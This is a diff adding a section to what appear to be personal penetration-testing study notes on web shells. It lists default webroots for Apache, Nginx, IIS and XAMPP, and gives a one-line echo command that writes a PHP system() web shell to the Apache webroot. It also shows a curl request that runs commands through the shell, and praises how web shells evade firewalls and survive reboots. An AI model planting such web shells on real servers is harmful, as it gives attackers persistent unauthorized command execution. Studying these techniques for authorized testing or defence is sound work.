@@ -69,3 +69,27 @@ The following are some common short web shell scripts for common web languages:
 <% eval request("cmd") %>
 ```
 
+#### Uploading a Web Shell
+The following are the default webroots for common web servers:
+
+|Web Server|Default Webroot|
+|---|---|
+|`Apache`|/var/www/html/|
+|`Nginx`|/usr/local/nginx/html/|
+|`IIS`|c:\inetpub\wwwroot\|
+|`XAMPP`|C:\xampp\htdocs\|
+We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:
+```bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+
+#### Accessing Web Shell
+Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:
+![[Pasted image 20260111004013.png]]
+
+**cURL**
+```shell-session
+ curl http://SERVER_IP:PORT/shell.php?cmd=id
+```
+we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on `80` or `443`, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.
+
